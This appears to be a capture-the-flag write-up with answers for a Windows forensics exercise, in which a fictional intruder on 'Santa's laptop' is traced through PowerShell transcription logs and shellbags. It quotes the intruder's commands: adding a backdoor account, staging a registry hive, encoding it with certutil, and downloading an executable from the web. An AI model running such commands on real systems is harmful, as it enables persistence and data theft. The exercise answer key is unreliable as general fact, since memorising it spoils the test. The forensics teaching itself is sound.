# [Day 8] Special by John Hammond - Santa's Bag of Toys

## Learning Objectives

1. What are PowerShell Transcription Logs?
2. What is a Living Off The Land binary (LOLbin)?
3. What are Shellbags?

## What operating system is Santa's laptop running ("OS Name")?

Going into: `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP._s3k_jad.20211128153510` we can find the OS Name

Answer:
```
Microsoft Windows 11 Pro
```

## What was the password set for the new "backdoor" account?

Going into `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP.k_dg27us.20211128153538` we can find that the following command was run:

```powershell
net user s4nta grinchstolechristmas /add
```

Answer:
```
grinchstolechristmas
```

## In one of the transcription logs,  the bad actor interacts with the target under the new backdoor user account, and copies a unique file to the Desktop. Before it is copied to the Desktop, what is the full path of the original file?

Going into `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734` we can find that the following command was run:

```powershell
copy C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat .
```

Answer:
```
C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat
```

## The actor uses a Living Off The Land binary (LOLbin) to encode this file, and then verifies it succeeded by viewing the output file. What is the name of this LOLbin?

Going into `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734` we can find that the following command was run:

```powershell
certutil.exe -enconde .\UsrClass.dat santa.dat
```

Answer:
```
certutil.exe
```

## Drill down into the folders and see if you can find anything that might indicate how we could better track down what this SantaRat really is. What specific folder name clues us in that this might be publicly accessible software hosted on a code-sharing platform?

Using [CyberChef](https://gchq.github.io/CyberChef/) we can decode from Base64 the content of the fake certificate generated by certutil as seen in `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734` \

We can now open the decrypted UsrClass.dat in [ShellBagsExplorer](https://ericzimmerman.github.io/#!index.md) by going to File > Load offline hive and look in: `SantaRat\SantaRat-main`

Answer:
```
.github
```

## Additionally, there is a unique folder named "Bag of Toys" on the Desktop! This must be where Santa prepares his collection of toys, and this is certainly sensitive data that the actor could have compromised. What is the name of the file found in this folder? 

Using [CyberChef](https://gchq.github.io/CyberChef/) we can decode from Base64 the content of the fake certificate generated by certutil as seen in `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734` \

We can now open the decrypted UsrClass.dat in [ShellBagsExplorer](https://ericzimmerman.github.io/#!index.md) by going to File > Load offline hive and look in: `Bag of Toys`

Answer:
```
bag_of_toys.zip
```

## What is the name of the user that owns the SantaRat repository?

Going to the [repository](https://github.com/Grinchiest/SantaRat) we can find the user

Answer:
```
Grinchiest
```

## Explore the other repositories that this user owns. What is the name of the repository that seems especially pertinent to our investigation?

Going to [Grinchiest's github profile](https://github.com/Grinchiest?tab=repositories) we can find a particular repository

Answer:
```
operation-bag-of-toys
```

## Read the information presented in this repository. It seems as if the actor has, in fact, compromised and tampered with Santa's bag of toys! You can review the activity in the transcription logs. It looks as if the actor installed a special utility to collect and eventually exfiltrate the bag of toys. What is the name of the executable that installed a unique utility the actor used to collect the bag of toys?

Going into `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP.b+XfnW7t.20211128154858` we can find that the following command was run:

```powershell
(New-Object Net.WebClient).DownloadFile("https://sam.gleske.net/uharc/uharc-cmd-install.exe", "C:\Users\s4nta\Desktop\uharc-cmd-install.exe")
```

Answer:
```
uharc-cmd-install.exe
```

## The actor looks to have removed everything from the bag of toys, and added in new things like coal, mold, worms, and more!  What are the contents of these "malicious" files (coal, mold, and all the others)?

Going into `C:\Users\Administrator\Desktop\SantasLaptopLogs\PowerShell_transcript.LAPTOP.myCoN9lB.20211128155453` we can find that the following command was run:

```powershell
echo "GRINCHMAS" > C:\Users\santa\Desktop\Bag` Of` Toys\coal
```

Answer:
```
GRINCHMAS
```

## What is the password to the original bag_of_toys.uha archive? (You do not need to perform any password-cracking or bruteforce attempts)

Going to [this commit](https://github.com/Grinchiest/operation-bag-of-toys/commit/41615462e4fdc0ceeb4ef1bec693ec3de1125ed2) we can find the password in the commit message

Answer:
```
TheGrinchiestGrinchmasOfAll
```

## How many original files were present in Santa's Bag of Toys?

Using the password found on github we can extract the original bag_of_toys.uha

Answer:
```
228
```